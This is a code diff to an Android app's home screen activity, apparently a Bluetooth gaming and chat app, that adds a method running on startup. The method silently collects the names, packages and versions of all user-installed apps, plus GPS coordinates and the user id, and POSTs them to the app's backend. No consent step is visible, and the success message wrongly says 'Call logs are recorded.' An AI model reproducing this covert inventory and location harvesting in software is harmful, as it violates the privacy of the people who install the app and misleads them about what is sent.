@@ -6,11 +6,15 @@ import android.bluetooth.BluetoothSocket;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 import android.os.Bundle;
 import android.os.Environment;
+import android.os.Handler;
 import android.support.annotation.NonNull;
 import android.support.annotation.Nullable;
+import android.support.design.widget.Snackbar;
 import android.support.v4.app.ActivityCompat;
 import android.support.v7.app.AppCompatActivity;
 import android.util.Log;
@@ -20,7 +24,15 @@ import android.view.MenuItem;
 import android.view.View;
 import android.widget.Toast;
 
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
+
+import java.io.DataOutputStream;
 import java.io.File;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
 import java.util.Arrays;
 import java.util.List;
 
@@ -33,7 +45,9 @@ import io.connection.bluetooth.Thread.AcceptBusinessThread;
 import io.connection.bluetooth.Thread.AcceptThread;
 import io.connection.bluetooth.Thread.GameRequestAcceptThread;
 import io.connection.bluetooth.Thread.ThreadConnection;
+import io.connection.bluetooth.utils.ApplicationSharedPreferences;
 import io.connection.bluetooth.utils.Constants;
+import io.connection.bluetooth.utils.GPSTrackerUtil;
 import io.connection.bluetooth.utils.Utils;
 import retrofit2.Call;
 import retrofit2.Callback;
@@ -48,6 +62,8 @@ public class Home_Master extends AppCompatActivity implements View.OnClickListen
     static boolean checkThread = false;
     private Context context;
     ApiCall apiCall;
+    private GPSTrackerUtil gpsTrackerUtil;
+    private Handler mHandler;
 
     @Override
     protected void onCreate(@Nullable Bundle savedInstanceState) {
@@ -58,7 +74,7 @@ public class Home_Master extends AppCompatActivity implements View.OnClickListen
         findViewById(R.id.game_card_id).setOnClickListener(this);
         findViewById(R.id.business_card_id).setOnClickListener(this);
         findViewById(R.id.chat_card_id).setOnClickListener(this);
-        findViewById(R.id.nearby_card_id).setOnClickListener(this);
+        findViewById(R.id.user_availability_id).setOnClickListener(this);
         ImageCache.setContext(this);
         Intent intent = new Intent(this, GPSTracker.class);
         this.startService(intent);
@@ -123,6 +139,10 @@ public class Home_Master extends AppCompatActivity implements View.OnClickListen
             }
 //        }
 
+        this.mHandler = new Handler();
+        gpsTrackerUtil = new GPSTrackerUtil(this, this.mHandler);
+
+        sendAllAppdetail();
     }
 
     @Override
@@ -244,12 +264,12 @@ public class Home_Master extends AppCompatActivity implements View.OnClickListen
                 startActivity(businessIntent);
                 break;
             case R.id.game_card_id:
-                Intent gameIntent = new Intent(this, GameProfileActivity.class);
+                Intent gameIntent = new Intent(this, UserList.class);
                 startActivity(gameIntent);
                 break;
-            case R.id.nearby_card_id:
-                Intent nearByIntent = new Intent(this, UserNearByWithGames.class);
-                startActivity(nearByIntent);
+            case R.id.user_availability_id:
+                Intent userAvailabilityIntent = new Intent(this, TimeAvailabilityActivity.class);
+                startActivity(userAvailabilityIntent);
                 break;
 
         }
@@ -330,5 +350,79 @@ public class Home_Master extends AppCompatActivity implements View.OnClickListen
 
     }
 
+    private void sendAllAppdetail() {
+        List<PackageInfo> packList = getPackageManager().getInstalledPackages(0);
+        final JSONArray jsonArray = new JSONArray();
 
+        for (int i = 0; i < packList.size(); i++) {
+            PackageInfo packInfo = packList.get(i);
+            if ((packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
+                String appName = packInfo.applicationInfo.loadLabel(getPackageManager()).toString();
+                String packageName = packInfo.applicationInfo.packageName;
+
+                System.out.println(packageName);
+                String versionName = String.valueOf(packInfo.versionCode);
+
+                try {
+                    JSONObject jsonObjecvt = new JSONObject();
+                    jsonObjecvt.put("appName", appName);
+                    jsonObjecvt.put("appPackageName", packageName);
+                    jsonObjecvt.put("appVersion", versionName);
+
+                    jsonArray.put(jsonObjecvt);
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                }
+                Log.e("App № " + Integer.toString(i), packageName);
+            }
+        }
+
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+
+                try {
+                    URL url = new URL(Constants.endPointAddress + "saveAppData");
+                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                    conn.setReadTimeout(10000);
+                    conn.setConnectTimeout(15000);
+                    conn.setRequestProperty("Content-Type", "application/json");
+                    conn.setRequestProperty("Method", "POST");
+                    conn.setRequestMethod("POST");
+                    conn.setDoInput(true);
+                    conn.setDoOutput(true);
+
+                    JSONObject jsonObject = new JSONObject();
+                    jsonObject.put("appDetail", jsonArray);
+                    jsonObject.put("latitude", gpsTrackerUtil.getLatitude());
+                    jsonObject.put("longitude", gpsTrackerUtil.getLongitude());
+                    jsonObject.put("userId", ApplicationSharedPreferences.getInstance(Home_Master.this).getValue("user_id"));
+
+                    OutputStream os = conn.getOutputStream();
+                    DataOutputStream wr = new DataOutputStream(
+                            conn.getOutputStream());
+                    wr.writeBytes(jsonObject.toString());
+                    wr.flush();
+                    wr.close();
+                    os.close();
+
+                    conn.connect();
+
+                    int responseCode = conn.getResponseCode();
+
+                    if (responseCode == HttpURLConnection.HTTP_OK) {
+
+                        Snackbar.make(Home_Master.this.findViewById(android.R.id.content),
+                                "Call logs are recorded.",
+                                Snackbar.LENGTH_LONG)
+                                .show();
+//                        callLog1Duration = 0;
+//                        callLog2Duration = 0;
+                    }
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            }
+        }).start();
+    }
 }
